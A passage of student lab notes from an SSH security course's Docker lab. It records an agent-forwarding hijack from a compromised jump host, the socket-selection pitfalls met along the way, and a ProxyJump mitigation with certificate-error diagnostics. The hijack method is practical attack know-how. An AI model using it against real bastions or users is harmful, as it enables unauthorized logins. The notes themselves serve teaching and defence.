attached (`ED25519-CERT`). And `pgrep` shows **three** `ssh -A` processes — every one of them
had created a socket in `/home/dev/.ssh/agent/`, which is why the earlier `ls -t` picked a
dead one.

Use the selector loop instead of `ls -t`: it keeps the socket that actually answers.

The hijack succeeds: `dev` on `target` (`1a097db4c2a2`), reached from the root shell on
jump, with the private key still only on the VM. After Exercise 6 target accepts nothing but
`publickey`, so this login could only have been a certificate signed through the forwarded
agent.

Artefact to ignore: `hostname: sethostname: Operation not permitted` appeared because the
comment text `→ dev, 1a097db4c2a2` was pasted onto the command line, so busybox `hostname`
was asked to **set** the hostname (root-only). Not a lab failure; bare `hostname` prints
normally.

target's log for the attacker's login (`docker compose logs --tail 5 target`):

```
_pending_
```

Expect `Accepted publickey for dev from 172.18.0.3 ... ED25519-CERT ... ID student@lab5
(serial 1) CA ED25519 SHA256:EiNe5...Bfvo` — the same line as your own logins, differing
only in the source address. In target's log the attacker and the legitimate user are
indistinguishable: that is 8a's operational problem stated as evidence.

### Gotcha: the wrong socket, and why `ls -t` lies

The first attempt picked
`/home/dev/.ssh/agent/s.nhVgl9EQFh.agent.FTTvAyVh1D` and `ssh-add -L` answered
`The agent has no identities.` — a **stale** socket from a session that no longer existed.
The live socket for the same session is `s.nhVgl9EQFh.sshd.1xgw6OEzM8`: same id, different
role suffix. `ls -t` sorts by mtime, so a stale file can win.

Rule: never guess the socket — read `$SSH_AUTH_SOCK` **inside the forwarding session** (that is
the path sshd created for it) and use that exact string. A dead relay reports zero
identities rather than an error, which is what makes this look like "the hijack found
nothing".

Second failure: the socket then gave `Error connecting to agent: No such file or directory`
because the `ssh -A jump` session had been exited (the prompt returned to `➜ ssc-lab5`) before
`docker compose exec jump sh` was run. **The forwarded socket lives only as long as the
`-A` session**, and the attacker shell must be a *separate* connection from it: either a new
tab on the Mac (`ssh -p 2222 student@localhost`) or a backgrounded session
(`ssh -A -f jump 'sleep 3600'`) with `docker compose exec jump sh` run from the VM.

Screenshot: both terminals side by side (`_pending_: `../reports/images/G05Ex7-hijack.png`).

7a: the attacker used the **agent**, not the key — `SSH_AUTH_SOCK` pointed at the forwarded
socket, so the signature was produced by the agent on the VM. The private key never left the
workstation; the *authority to use it* was delegated to jump by `-A`, and jump was
compromised. The certificate is no defence: it is a valid credential for its whole hour and
the agent holds it.

---

## Exercise 8 — mitigation

```bash
ssh -J jump -i ~/.ssh/id_dev dev@target
```

First attempt failed — the certificate had expired between the hijack and this command:

```
$ ssh -J jump -i ~/.ssh/id_dev dev@target
dev@target: Permission denied (publickey).
```

The last signing was `12:17:00 → 13:18:25` in **VM local time**; `date` confirms WEST (UTC+1),
so the credential died at `12:18 UTC` — before this attempt. sshd's reason:

```
target | Refusing certificate ID "student@lab5" serial=1 signed by ED25519 CA SHA256:EiNe5...Bfvo: Certificate invalid: expired
target | Connection closed by authenticating user dev 172.18.0.3 port 37680 [preauth]
```

Re-issued and retried:

```bash
ssh-keygen -s ~/.ssh/user_ca -I 'student@lab5' -n dev -z 1 -V +1h ~/.ssh/id_dev.pub
# Signed user key ... valid from 2026-10-21T15:01:00 to 2026-10-21T16:02:02
ssh -J jump -i ~/.ssh/id_dev dev@target
```

Observed:

```
1a097db4c2a2:~$
```

Same destination, same certificate, no agent involved: jump forwards a TCP stream and never
holds a socket that can sign.

This is the handout's warning made real, and the evidence for 2a and 5b: **expiry and
revocation are the same message on the client**, and only target's log separates them.

| Cause | Client sees | target's log says |
|---|---|---|
| expired | `Permission denied (publickey)` | `Certificate invalid: expired` |
| revoked | `Permission denied (publickey)` | `... revoked by file /etc/ssh/revoked_keys` |
| principal not allowed | `Permission denied (publickey)`, or a password prompt pre-Ex. 6 | `Certificate does not contain an authorized principal` |
| no certificate | `Permission denied (publickey)` | no certificate line |

8a: `ProxyJump` forwards a TCP stream, not a credential — the SSH session and its
authentication are end-to-end VM↔target, so jump only relays ciphertext. `-A` forwards a
capability. Rule: `-A` only to a host you fully control and trust, for one short session,
never to a bastion you do not administer; default `ForwardAgent no` (global or per `Host`)
and use `-J` for chaining. Defence in depth: `ssh-add -c` (each use prompts — a hijacked
socket becomes a prompt you did not expect), `ssh-add -t`, short-lived certs. Note the
asymmetry: jump still authenticates you by **raw key** in `authorized_keys`, which is why a
compromised jump is worth so much.

Teardown: `docker compose down`, then restore `lab5-clean`. Editors beware: `sshd_config` is
`COPY`ed into the image, so container edits die with the container and new containers mint
new host keys.

---

## Report mapping

| Report item | Source here | Form |
|---|---|---|
| P1 | `docker compose ps` + `ls id_*.pub` | text / G05Prep1.png |
| P2 | prose above | prose |
| 1a | Ex. 1 result + host-key prompts | screenshot |
| 2a | Ex. 2 `-Lf` | **text, required** |
| 3a / 4a / 4b | Ex. 3–4 tables | table + prose |
| 4b | ops cert `-Lf` | **text, required** |
| 5a / 5b | Ex. 5 `-Qf` + table | text + table |
| 6a | broken `sshd -T`, 2/1/4, fix, fixed `sshd -T`, prediction | **text, required** |
| 6b / 6c | ranked table + sentence | table + prose |
| 7a / 8a | hijack screenshot + operator rule | screenshot + prose |
| final config | `~/target-sshd_config.final` | **text, required** |
| appendix | reflections Lab 3, 4, 5 | prose 200–300 w. |

Deadline: Blackboard, Sunday 1 November (time per assignment page).
